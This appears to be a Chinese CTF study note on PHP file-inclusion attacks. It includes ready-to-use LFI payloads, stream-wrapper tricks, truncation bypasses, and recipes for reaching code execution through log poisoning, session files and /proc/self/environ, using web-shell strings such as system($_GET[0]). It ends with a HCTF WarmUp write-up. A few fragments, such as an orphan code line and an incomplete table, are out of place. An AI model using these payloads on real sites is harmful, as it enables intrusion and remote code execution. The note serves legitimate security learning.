# 文件包含专题（LFI / RFI）

> **一句话:应用把用户的输入拼进了 `include`,于是你能让它加载任意文件 —— 包括你自己造的文件。**

---

## 一、先判断有没有这个点

### 四个函数

| 函数 | 失败时 | 特点 |
|---|---|---|
| `include` | **Warning**,继续执行 | 最常用 |
| `include_once` | 同上 | 只包含一次 |
| `require` | **Fatal**,中断 | |
| `require_once` | 同上 | |

### 有洞的样子

```php
include $_GET['page'];
include "pages/" . $_GET['p'] . ".php";
require $file;
```

**参数直接或间接进入 include → 就是洞。**

### 判断方法

```text
?page=about         → 正常
?page=nonexist      → 报错里有路径/文件名        ← 有戏
?page=/etc/passwd   → 内容是 passwd              ← 成了
```

**报错信息最值钱：**

```
Warning: include(nonexist.php): failed to open stream: No such file or directory
in /var/www/html/index.php on line 3
```

**→ 立刻知道：web 根是 `/var/www/html`，参数被直接拼进去了。**

## 二、LFI 和 RFI

| | 全称 | 条件 | 能做什么 |
|---|---|---|---|
| **LFI** | Local File Inclusion | 默认可用 | 读本机文件 |
| **RFI** | Remote File Inclusion | `allow_url_include=On`（默认 **Off**） | 包含远程服务器上的文件 → 直接 RCE |

**RFI 现在基本见不到（默认关了），CTF 里大多是 LFI + 伪协议。**

---

## 三、伪协议（最常用的一节）

### ① `php://filter` —— 读源码，不执行

```text
?file=php://filter/convert.base64-encode/resource=index.php
```

**为什么需要它：**

```text
include("index.php")        →  PHP 执行它,你只看到输出
include("php://filter/...") →  base64 编码后给你,不执行
```

**拿到 base64 自己解码，就能看到源码。**

**常用过滤器链：**

| 过滤器 | 作用 |
|---|---|
| `convert.base64-encode` | base64 编码（最常用） |
| `convert.base64-decode` | 解码 |
| `convert.iconv.UTF8.UTF7` | 绕过某些关键字过滤 |
| `string.strip_tags` | 去标签 |

### ② `php://input` —— 把请求体当文件

```text
?file=php://input        （POST body 里放 PHP 代码）
```

**前提：`allow_url_include=On`（有些题会开）。**

### ③ `data://` —— 把字面量当文件

```text
?file=data://text/plain,<?php system('id'); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

**同样需要 `allow_url_include=On`。**

### ④ `phar://` —— 触发反序列化

```text
?file=phar://uploads/avatar.jpg/x
```

**前提：存在一个 phar 文件（通常靠上传得到），且代码里有可用的魔术方法。**

**注意：`phar://` 在读文件时就会触发**反序列化**，不需要真的包含到那个文件内容。**

### ⑤ `zip://`

```text
?file=zip://uploads/avatar.zip%23shell.php
```

**`%23` 是 `#`，后面是压缩包里的文件名。**

### ⑥ `file://`

```text
?file=file:///etc/passwd
```

**只是显式声明协议，和其他读法等价。**

### 一张表记住

| 协议 | 能读源码 | 能 RCE | 前提 |
|---|---|---|---|
| `php://filter` | ✅ | ❌ | 无 |
| `php://input` | ❌ | ✅ | `allow_url_include=On` |
| `data://` | ❌ | ✅ | `allow_url_include=On` |
| `phar://` | 间接 | 间接 | 有 phar 文件 + 魔术方法 |
| `zip://` | ✅ | ✅ | 有压缩包 |

## 四、路径与截断的五个技巧

### ① `../` 跳目录

```text
?file=../../../../etc/passwd
```

**最基础，和路径遍历一样。**

### ② `?` 截断（WarmUp 用的）

**当代码是 `include $_GET['file'] . '.php'` 时：**

```text
?file=../../../../flag.php?
```

**后面拼的 `.php` 被 `?` 挡住。**（取决于 PHP 版本和路径处理）

### ③ `%00` 截断

```text
?file=../../../../flag.php%00
```

**只对 PHP < 5.3.4 有效。**

### ④ 长度截断

**老 PHP 有路径长度上限（4096 或 260），超长会被截断。**

### ⑤ `?/../` 词法折叠（WarmUp 的真正机制）⭐

**这是我实测出来的：**

```text
include("不存在的目录/../target.php")   →  能成功加载 target.php
include("sub/../target.php")            →  能成功
include("nonexist?/../target.php")      →  失败(Windows)
```

**结论：PHP 对 include 的路径做**词法折叠** —— `..` 把前一段抵掉，**不需要那一段真实存在**。**

**所以 WarmUp 的 payload：**

```text
?file=source.php?/../../../../ffffllllaaaagggg
       └────┬────┘ └──┬──┘
      校验时截断到这里   然后被 ../../ 一路上跳
```

**校验看的是 `?` 之前（`source.php`，在白名单里），include 用的是整串 —— 而 `source.php?` 这一段被后面的 `..` 抵掉了，根本不需要它存在。**

**⚠️ 这个"非法目录名 + `/..`"的技巧在 Windows 上不成立（`?` 是非法文件名字符），只在 Linux 上有效。**

## 五、从"读文件"到 RCE 的五条路

### ① 日志包含（最经典）

```text
① 访问带 payload 的 URL,让 payload 进 access.log
   GET /<?php system($_GET[0]); ?> HTTP/1.1
② 包含日志
   ?file=/var/log/apache2/access.log&0=id
```

| 服务器 | 日志路径 |
|---|---|
| Apache (Debian/Ubuntu) | `/var/log/apache2/access.log` |
| Apache (CentOS) | `/var/log/httpd/access_log` |
| Nginx | `/var/log/nginx/access.log` |

**PHP 的 `<?php` 在 log 里会被原样记录 → 被 include 时执行。**

### ② session 包含

```text
① 往 session 里写:  ?name=<?php system($_GET[0]); ?>
② 包含:  ?file=/tmp/sess_<PHPSESSID>
```

**session 文件路径：**

```text
/tmp/sess_<id>                    ← 默认
/var/lib/php/sessions/sess_<id>   ← Debian/Ubuntu 常见
```

### ③ `/proc/self/environ`

```text
User-Agent: <?php system($_GET[0]); ?>
?file=/proc/self/environ&0=id
```

**UA 会被写进进程环境变量。**（需要 PHP 有权限读）

### ④ 直接写、直接包含

```text
?file=php://input        POST: <?php system('id'); ?>
?file=data://text/plain,<?php system('id'); ?>
```

**最省事，但要 `allow_url_include=On`。**

### ⑤ 上传 + 包含

**传一个图片马（`.jpg` 里带 PHP），再 `include` 它。**

**这是"上传题"和"包含题"的交汇点 —— 上传题里绕过校验得到的文件，最后常常要靠包含来执行。**

### Linux

| 路径 | 用途 |
|---|---|
| `/etc/passwd` | 探针 |
| `/etc/shadow` | 密码哈希（需 root） |

| `/var/lib/php/sessions/sess_<id>` | 同上 |

## 七、实战记录

### 7.1 ✅ [HCTF 2018] WarmUp

**考点：白名单 + `?` 截断 + 路径词法折叠**

**源码核心：**

```php
class emmm {
    public static function checkFile(&$page) {
        $whitelist = ["source"=>"source.php", "hint"=>"hint.php"];
        if (in_array($page, $whitelist)) return true;                    // ① 原样
        $_page = mb_substr($page, 0, mb_strpos($page.'?','?'));          // ② 截到 ?
        if (in_array($_page, $whitelist)) return true;
        $_page = urldecode($page);                                       // ③ 解码后再截
        $_page = mb_substr($_page, 0, mb_strpos($_page.'?','?'));
        if (in_array($_page, $whitelist)) return true;
        return false;
    }
}
include $_REQUEST['file'];
```

**payload：**

```text
?file=source.php?/../../../../ffffllllaaaagggg
```

**`../` 数量一个一个往上加。**

**为什么能过：校验截到 `?` 只剩 `source.php`（白名单内），而 include 拿到整串，`source.php?` 被后面的 `..` 抵掉。**

→ 详见 WP：[/blog/hctf2018-warmup/](../../blog/posts/2026-10-24-hctf2018-warmup.md)

if (file_get_contents($text,'r') === "welcome to the zjctf") {   // 第一层

## 八、我踩的坑

### 坑 1：以为 `include` 只认 `../` 路径

**`source.php?/../` 这种"非法目录名 + `/..`"也能过关 —— 因为 PHP 对路径做词法折叠，不检查中间段是否存在。**

### 坑 2：忘了校验和 include 用的不是同一个字符串

**WarmUp 里 `checkFile` 用 `$_page`（截断后的），`include` 用 `$_REQUEST['file']`（原始串）。**

**这类"校验与使用不一致"是所有绕过题的母题**，和路径遍历六关、上传题的三道防线是同一个模型。

### 坑 3：`php://filter` 拼错

```text
❌ php://filter/read=convert.base64encode/resource=index.php   （少个横杠）
✅ php://filter/read=convert.base64-encode/resource=index.php
```

**拼错不会报错，只会返回空 —— 很容易误判成"没这个文件"。**

### 坑 4：以为 `echo` 能打印数组

**和 RCE 专题里同一条：`echo` 数组只会输出 `Array`。**

---

## 九、一句话总结

> **文件包含 = 参数进了 `include`。**
>
> **读源码用 `php://filter/convert.base64-encode`；要执行用 `php://input` 或 `data://`；**
> **要 RCE 且协议被禁，就写日志 / 写 session / 传图片马，再包含它。**
>
> **绕过白名单的核心永远是：校验看的是 A 串，include 用的是 B 串 —— 找 A 和 B 的差。**
